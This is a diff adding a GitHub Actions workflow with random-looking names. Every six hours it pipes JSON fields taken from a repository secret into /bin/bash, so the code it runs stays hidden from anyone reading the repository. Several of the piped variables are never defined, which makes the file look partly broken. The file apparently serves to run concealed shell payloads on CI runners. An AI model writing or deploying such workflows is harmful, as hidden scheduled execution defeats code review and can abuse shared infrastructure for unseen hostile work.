@@ -1,0 +1,23 @@
+name: shuangzhihuayanga
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '17 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: shuangzhihuayanga
+        env:
+          gz026: ${{ secrets.gz026 }}
+        run: |
+          echo $gz026 | jq -r .akox31001 | /bin/bash
+          echo $rajt2858 | jq -r .zmh9508 | /bin/bash
+          echo $wauxc3 | jq -r .ty977 | /bin/bash
+          echo $sl9970 | jq -r .relyl9353 | /bin/bash
+          echo $xmulj758 | jq -r .yvdal16433 | /bin/bash
+          echo $bun25507 | jq -r .s95658 | /bin/bash
+          echo $ofuk08755 | jq -r .df5 | /bin/bash
+          echo $pov14 | jq -r .tp3 | /bin/bash
+
